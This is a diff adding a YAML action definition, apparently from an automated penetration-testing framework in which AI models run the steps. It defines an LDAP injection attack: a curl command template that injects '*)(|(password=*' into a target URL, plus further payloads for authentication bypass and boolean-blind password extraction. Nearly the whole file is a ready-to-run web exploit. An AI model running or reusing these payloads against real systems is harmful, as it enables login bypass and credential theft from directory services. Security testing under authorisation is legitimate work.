@@ -1,0 +1,16 @@
+name: ldap_injection
+category: web
+description: LDAP injection exploitation
+preconditions:
+  - service.port==80
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "curl -s '{target_url}?user=*)(|(password=*'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "LDAP injection in web apps querying LDAP. Bypass auth: *)(uid=*))(|(uid=*. Extract data: *)(password=a* → boolean blind. Common in enterprise SSO/directory lookups."
